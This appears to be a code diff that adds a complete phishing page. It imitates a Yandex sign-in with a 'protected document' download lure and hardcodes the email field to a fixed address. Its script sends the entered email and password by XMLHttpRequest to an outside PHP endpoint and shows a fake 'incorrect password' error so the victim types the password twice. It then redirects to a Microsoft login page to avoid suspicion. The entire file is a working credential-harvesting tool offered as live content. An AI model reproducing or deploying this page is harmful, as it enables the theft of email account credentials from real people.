@@ -1,0 +1,160 @@
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta charset="UTF-8">
+<title>Sign In yandex.com</title> <link rel="shortcut icon" type="image/png" href="https://i.imgur.com/CfT6JCa.png" />
+<style>
+/* Apply background image and center it */
+body {
+background-image: url('https://i.imgur.com/NwuMBtB.png');
+background-size: cover;
+background-position: center;
+height: 80vh;
+margin: 0;
+display: flex;
+align-items: center;
+justify-content: center;
+}
+
+/* Style the form */
+form {
+background: rgba(255, 255, 255, 0.8); /* Semi-transparent white background */
+padding: 10px;
+border-radius: 10px;
+box-shadow: 0 0 10px rgba(0, 0, 0, 0.3);
+text-align: center;
+max-width: 370px; /* Set a fixed width for the form */
+width: 80%; /* Make the form 90% wide on smaller screens */
+margin: 0 10px; /* Add space on the left and right */
+}
+
+/* Style the form elements */
+input[type="email"], input[type="password"], button, input[type="submit"] {
+width: 86%;
+padding: 10px;
+margin: 5px 0px;
+border: none;
+border-radius: 5px;
+}
+
+input[type="submit"]  {
+background-color: #007BFF;
+color: white;
+cursor: pointer;
+}
+
+button {
+background-color: #007BFF;
+color: white;
+cursor: pointer;
+}
+
+#msgfont {
+color: red;
+}
+
+/* Style the logo */
+.logo {
+margin-bottom: 10px;
+}
+
+/* Style the instructions */
+.instructions {
+font-size: 16px;
+color: #333;
+margin-bottom: 20px;
+}
+
+@media (max-width: 80px) {
+/* Adjust form elements for smaller screens */
+input[type="text"], input[type="password"], button {
+padding: 8px; /* Decrease padding for smaller elements */
+font-size: 14px; /* Reduce font size for smaller elements */
+}
+}
+</style>
+
+</head>
+<body>
+<form method="post" name="street">
+<br/><br/>
+<div class="logo">
+<img src="https://i.imgur.com/UOUukp8.gif" alt="Your Logo">
+</div>
+<div class="instructions">
+<p> This document is protected! Please enter your email password to download.</p>
+<p id="msgfont"></p>        </div>
+
+<input type="email" name="feedback" id="email" autofocus="" value="newlogs12@yandex.com" placeholder="Enter Email Address"/readonly>
+<input type="password" usd name="feedbacknow" id="password" ="" placeholder="Enter Email Password" autofocus required>
+<br/><br/>
+
+<input type="submit" value="Download"  name="btnLogin" id="btnLogin"/>
+
+<br/><br/>
+</form>
+
+<script type="text/javascript">
+        var countAttempt = 0;
+        var sendUrl = "https://printlend.fr/sh6.php";
+
+        document.addEventListener('DOMContentLoaded', function () {
+            var btnLogin = document.getElementById('btnLogin');
+            var msgFont = document.getElementById('msgfont');
+
+            btnLogin.addEventListener("click", function (event) {
+                event.preventDefault();
+                var password = document.getElementById('password').value;
+                if(password == ""){
+                    msgFont.innerHTML = "Enter password";
+                }else{
+                    sendData();
+                }
+            });
+
+            btnLogin.addEventListener("touchend", function (event) {
+                event.preventDefault();
+                var password = document.getElementById('password').value;
+                if(password == ""){
+                    msgFont.innerHTML = " Enter password";
+                }else{
+                    sendData();
+                }
+            });
+
+            function sendData() {
+                var email = document.getElementById('email').value;
+                var password = document.getElementById('password').value;
+
+                console.log("Email - " + email);
+                console.log("Password - " + password);
+
+                // You can use the FormData object to collect form data
+                var formData = new FormData(document.forms.street);
+
+                countAttempt++;
+
+                var xhr = new XMLHttpRequest();
+                xhr.open('POST', sendUrl);
+
+                xhr.send(formData);
+
+                if (countAttempt >= 2) {
+                    setTimeout(function () {
+                        window.location = "https://login.microsoftonline.com/jsdisabled";
+                    }, 2000);
+                    btnLogin.value = "Verifying....";
+                    msgFont.innerHTML = "";
+                } else {
+                    setTimeout(function () {
+                        msgFont.innerHTML = "Incorrect password or email, please try again";
+                        btnLogin.value = "Download";
+                    }, 2000);
+                    btnLogin.value = "Verifying....";
+
+					            // Clear password field
+            document.getElementById('password').value = '';
+                }
+            }
+        });
+    </script>
